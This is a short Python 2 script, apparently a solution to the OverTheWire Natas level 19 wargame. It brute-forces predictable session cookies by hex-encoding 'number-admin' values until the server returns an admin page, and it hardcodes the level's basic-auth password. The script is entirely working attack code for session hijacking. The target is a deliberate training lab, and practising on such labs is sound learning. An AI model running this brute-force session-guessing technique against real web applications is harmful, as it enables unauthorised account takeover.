#!/usr/bin/python
#h15h4m

import requests
from requests.auth import HTTPBasicAuth


for i in range(1,641,1):
    cookies = dict(PHPSESSID=(str(i)+ '-admin').encode('hex'))
    r = requests.get('http://natas19.natas.labs.overthewire.org/index.php',auth=HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), cookies=cookies)
    if r.content.find('You are an admin') != -1:
        print '[+] FOUND ' + str(i)
        print r.content
        exit()
    else:
        print '[!] ' + str(i)
